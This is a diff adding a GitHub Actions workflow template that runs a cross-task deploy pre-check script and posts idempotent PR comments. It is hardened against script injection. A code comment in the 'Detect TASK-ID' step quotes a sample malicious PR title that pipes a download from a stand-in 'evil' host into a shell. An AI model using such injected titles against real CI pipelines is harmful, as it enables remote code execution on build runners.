@@ -1,0 +1,278 @@
+# SDLC Cross-TASK Deploy Pre-check (PR 29 / PR 18.4 wire-up — Rule 19 CI Gate)
+#
+# Wires `scripts/sdlc-deploy-precheck.sh` (PR 24) into GitHub Actions so that
+# PRs targeting cross-TASK deploy coordination are validated before merge.
+#
+# Triggers:
+#   pull_request — opened/synchronize/reopened (warn-only)
+#   merge_group  — checks_requested (STRICT — blocks merge)
+#   workflow_dispatch — manual rerun
+#
+# Behavior:
+#   - Detect TASK-ID from PR head ref (e.g., feat/TASK-001-foo) or PR title
+#     (e.g., "[TASK-001] add ..."); skip if no TASK-ID found
+#   - Detect target env from PR labels (deploy:staging / deploy:prod /
+#     deploy:dev); fallback to staging
+#   - Run sdlc-deploy-precheck.sh <TASK> <env>
+#   - PR event: warn-only (continue-on-error true)
+#   - merge_group: strict — fails the merge if precheck blocks
+#   - Idempotent PR comment: find existing bot comment + update; auto-delete on resolution
+#
+# Setup: Copy this file to .github/workflows/sdlc-deploy-precheck.yml
+# (Drop the .tpl from the filename when installing.)
+
+name: SDLC Cross-TASK Deploy Pre-check
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened, edited, labeled, unlabeled]
+  merge_group:
+    types: [checks_requested]
+  workflow_dispatch:
+
+# Same-PR concurrency: cancel in-flight runs from same PR.
+# V1.W4 fix: for merge_group, use base_ref (stable across requeues) instead of
+# head_sha (rotates per requeue → no cancel). pull_request.number is stable per PR.
+concurrency:
+  group: sdlc-deploy-precheck-${{ github.event.pull_request.number || github.event.merge_group.base_ref || github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  deploy-precheck:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write   # needed for comment idempotency
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Verify deploy-precheck script exists
+        id: check_script
+        run: |
+          if [ -x "scripts/sdlc-deploy-precheck.sh" ]; then
+            echo "exists=true" >> $GITHUB_OUTPUT
+          else
+            echo "::warning::sdlc-deploy-precheck.sh missing — cross-TASK deploy not validated"
+            echo "exists=false" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Resolve merge_group source PR (V1.W3 fix — strict gate must inspect queued PR)
+        id: resolve_pr
+        if: steps.check_script.outputs.exists == 'true' && github.event_name == 'merge_group'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MERGE_HEAD_SHA: ${{ github.event.merge_group.head_sha }}
+        run: |
+          set +e
+          # Find the open/recently-merged PR whose head matches merge_group.head_sha
+          PR_JSON=$(gh api "repos/${GITHUB_REPOSITORY}/commits/${MERGE_HEAD_SHA}/pulls" 2>/dev/null | head -c 50000)
+          # Extract first PR's head.ref + title (jq is preinstalled on ubuntu-latest)
+          if [ -n "$PR_JSON" ]; then
+            REF=$(echo "$PR_JSON" | jq -r '.[0].head.ref // ""' 2>/dev/null)
+            TITLE=$(echo "$PR_JSON" | jq -r '.[0].title // ""' 2>/dev/null)
+            LABELS_JSON=$(echo "$PR_JSON" | jq -c '.[0].labels // []' 2>/dev/null)
+          fi
+          # Use null-safe values
+          echo "ref=${REF:-}" >> $GITHUB_OUTPUT
+          echo "title=${TITLE:-}" >> $GITHUB_OUTPUT
+          # GitHub Actions multiline-output for JSON
+          DELIM="EOF_LABELS_$(date +%s)"
+          {
+            echo "labels<<$DELIM"
+            echo "${LABELS_JSON:-[]}"
+            echo "$DELIM"
+          } >> $GITHUB_OUTPUT
+
+      - name: Detect TASK-ID and target env
+        id: detect
+        if: steps.check_script.outputs.exists == 'true'
+        # V1.C1 fix: pass untrusted PR fields via env to prevent script injection (CWE-94).
+        # Direct ${{ }} interpolation into `run:` allows malicious titles like
+        # `"; curl evil|sh; #` to execute on the runner. env: forces values to be
+        # exposed as shell vars, where they're inert until quoted-expanded.
+        env:
+          PR_REF: ${{ github.event.pull_request.head.ref || github.head_ref || '' }}
+          PR_TITLE: ${{ github.event.pull_request.title || '' }}
+          PR_LABELS_JSON: ${{ toJson(github.event.pull_request.labels) }}
+          MG_REF: ${{ steps.resolve_pr.outputs.ref || '' }}
+          MG_TITLE: ${{ steps.resolve_pr.outputs.title || '' }}
+          MG_LABELS_JSON: ${{ steps.resolve_pr.outputs.labels || '[]' }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          set +e
+
+          # Pick PR source by event type; merge_group looks up queued PR via gh api (resolve_pr step)
+          if [ "$EVENT_NAME" = "merge_group" ]; then
+            REF="$MG_REF"
+            TITLE="$MG_TITLE"
+            LABELS="$MG_LABELS_JSON"
+          else
+            REF="$PR_REF"
+            TITLE="$PR_TITLE"
+            LABELS="$PR_LABELS_JSON"
+          fi
+
+          # Defense in depth: strip any control chars that survived expansion
+          REF=$(printf '%s' "$REF" | tr -d '\n\r\t' | head -c 200)
+          TITLE=$(printf '%s' "$TITLE" | tr -d '\n\r\t' | head -c 500)
+
+          # V2.W3 fix: collect ALL TASK-NNN / HOTFIX-NNN IDs (was: only first match)
+          # Iterate ref + title; dedupe; check each
+          ALL_IDS=$(printf '%s\n%s\n' "$REF" "$TITLE" | grep -oE '(TASK|HOTFIX)-[0-9]+' | sort -u | tr '\n' ' ')
+          ALL_IDS="${ALL_IDS% }"  # trim trailing space
+
+          if [ -z "$ALL_IDS" ]; then
+            echo "task_ids=" >> $GITHUB_OUTPUT
+            echo "::notice::No TASK-NNN / HOTFIX-NNN ID detected — skipping deploy pre-check"
+            echo "skip=true" >> $GITHUB_OUTPUT
+            exit 0
+          fi
+
+          # Detect target env from labels (deploy:prod | deploy:staging | deploy:dev)
+          TARGET_ENV="staging"
+          if echo "$LABELS" | grep -q '"deploy:prod"'; then
+            TARGET_ENV="prod"
+          elif echo "$LABELS" | grep -q '"deploy:dev"'; then
+            TARGET_ENV="dev"
+          elif echo "$LABELS" | grep -q '"deploy:staging"'; then
+            TARGET_ENV="staging"
+          fi
+
+          echo "task_ids=$ALL_IDS" >> $GITHUB_OUTPUT
+          echo "target_env=$TARGET_ENV" >> $GITHUB_OUTPUT
+          echo "skip=false" >> $GITHUB_OUTPUT
+          echo "::notice::Detected task_ids=[$ALL_IDS] target_env=$TARGET_ENV"
+
+      - name: Install jq
+        if: steps.check_script.outputs.exists == 'true' && steps.detect.outputs.skip != 'true'
+        run: |
+          if ! command -v jq >/dev/null 2>&1; then
+            sudo apt-get update -q && sudo apt-get install -y jq
+          fi
+
+      - name: Run sdlc-deploy-precheck.sh (V2.W3 — iterate all detected TASK IDs)
+        id: run_precheck
+        if: steps.check_script.outputs.exists == 'true' && steps.detect.outputs.skip != 'true'
+        # V1.C1 fix: pass detected outputs via env (defense-in-depth — outputs are
+        # already regex-validated in detect step, but consistent pattern reduces risk)
+        env:
+          TASK_IDS: ${{ steps.detect.outputs.task_ids }}
+          TARGET_ENV: ${{ steps.detect.outputs.target_env }}
+          EVENT_NAME: ${{ github.event_name }}
+          OUT_PATH: ${{ runner.temp }}/deploy-precheck-${{ github.run_id }}-${{ github.run_attempt }}.log
+        run: |
+          set +e
+          OUT="$OUT_PATH"
+          : > "$OUT"  # truncate
+          worst_rc=0
+
+          # V2.W3 fix: iterate all TASK-NNN / HOTFIX-NNN ids found
+          for tid in $TASK_IDS; do
+            echo "=== Running precheck for $tid @ $TARGET_ENV ===" | tee -a "$OUT"
+            bash scripts/sdlc-deploy-precheck.sh "$tid" "$TARGET_ENV" >> "$OUT" 2>&1
+            rc=$?
+            echo "--- $tid exit=$rc ---" | tee -a "$OUT"
+            if [ "$rc" -gt "$worst_rc" ]; then
+              worst_rc=$rc
+            fi
+          done
+
+          echo "result_path=$OUT" >> $GITHUB_OUTPUT
+          echo "exit_code=$worst_rc" >> $GITHUB_OUTPUT
+
+          # Show full output for visibility
+          echo "=== sdlc-deploy-precheck.sh aggregated exit=$worst_rc ==="
+          cat "$OUT" || true
+
+          if [ "$worst_rc" -eq 0 ]; then
+            echo "::notice::Deploy pre-check PASSED for [$TASK_IDS] @ $TARGET_ENV"
+          elif [ "$worst_rc" -eq 2 ]; then
+            echo "::warning::Deploy pre-check config error (exit=2) — likely missing state.json or invalid env"
+          else
+            echo "::error::Deploy pre-check BLOCKED (exit=$worst_rc) — see output above for failed checks"
+            # On merge_group: fail the job (block merge); on PR: warn-only
+            if [ "$EVENT_NAME" = "merge_group" ]; then
+              exit 1
+            fi
+          fi
+        continue-on-error: ${{ github.event_name != 'merge_group' }}
+
+      - name: Comment on PR (idempotent — find+update or create)
+        # V2.W2 fix: forked PRs have read-only pull-requests permission, so this
+        # step would 403 and fail the job. Skip comments on fork PRs (they still
+        # see the precheck output via job logs).
+        if: |
+          steps.check_script.outputs.exists == 'true' &&
+          steps.detect.outputs.skip != 'true' &&
+          github.event_name == 'pull_request' &&
+          github.event.pull_request.head.repo.full_name == github.repository
+        continue-on-error: true
+        uses: actions/github-script@v7
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RESULT_PATH: ${{ steps.run_precheck.outputs.result_path }}
+          EXIT_CODE: ${{ steps.run_precheck.outputs.exit_code }}
+          TASK_IDS: ${{ steps.detect.outputs.task_ids }}
+          TARGET_ENV: ${{ steps.detect.outputs.target_env }}
+        with:
+          script: |
+            const fs = require('fs');
+            const path = process.env.RESULT_PATH;
+            const exitCode = process.env.EXIT_CODE;
+            const taskIds = process.env.TASK_IDS;
+            const targetEnv = process.env.TARGET_ENV;
+
+            let output = '';
+            try {
+              output = fs.readFileSync(path, 'utf-8');
+            } catch (e) {
+              output = '(no output captured)';
+            }
+
+            const COMMENT_TAG = '<!-- sdlc-deploy-precheck -->';
+            const { owner, repo } = context.repo;
+            const issue_number = context.issue.number;
+
+            const { data: comments } = await github.rest.issues.listComments({
+              owner, repo, issue_number, per_page: 100,
+            });
+            const existing = comments.find(c => c.body && c.body.includes(COMMENT_TAG));
+
+            // Pass → delete prior comment (auto-resolve)
+            if (exitCode === '0') {
+              if (existing) {
+                await github.rest.issues.deleteComment({ owner, repo, comment_id: existing.id });
+              }
+              return;
+            }
+
+            // Build status badge
+            const badge = exitCode === '2'
+              ? '⚠️ Config error'
+              : '❌ Blocked';
+            // V1.I3 fix: branding "PR 18.4 / Rule 19" not "PR 18.1" (18.1 is just the script spec)
+            const title = exitCode === '2'
+              ? 'Deploy pre-check could not run'
+              : 'Cross-TASK Deploy Pre-check Failed (PR 18.4 / Rule 19 CI Gate)';
+
+            // Truncate output to 2000 chars
+            const trimmed = output.length > 2000 ? output.slice(0, 2000) + '\n... (truncated)' : output;
+
+            const body = `${COMMENT_TAG}\n## ${badge} ${title}\n\n` +
+              `**TASK(s)**: \`${taskIds}\` &nbsp; **Target env**: \`${targetEnv}\` &nbsp; **Exit code**: \`${exitCode}\`\n\n` +
+              `<details><summary>📋 Pre-check output</summary>\n\n\`\`\`\n${trimmed}\n\`\`\`\n\n</details>\n\n` +
+              `### Resolution paths\n` +
+              `1. **Wait for dependencies** — ensure dependent TASKs are deployed to \`${targetEnv}\` first (status: monitoring/completed)\n` +
+              `2. **Resolve migration ID conflicts** — coordinate with conflicting TASK or rename your migration\n` +
+              `3. **Override (last resort)** — add \`--override "<reason>"\` flag with documented justification\n\n` +
+              `<sub>This is a warning on \`pull_request\`. The merge gate (\`merge_group\`) will block merge if blockers persist. ` +
+              `This comment auto-updates on each push and auto-deletes when resolved.</sub>`;
+
+            if (existing) {
+              await github.rest.issues.updateComment({ owner, repo, comment_id: existing.id, body });
+            } else {
+              await github.rest.issues.createComment({ owner, repo, issue_number, body });
+            }
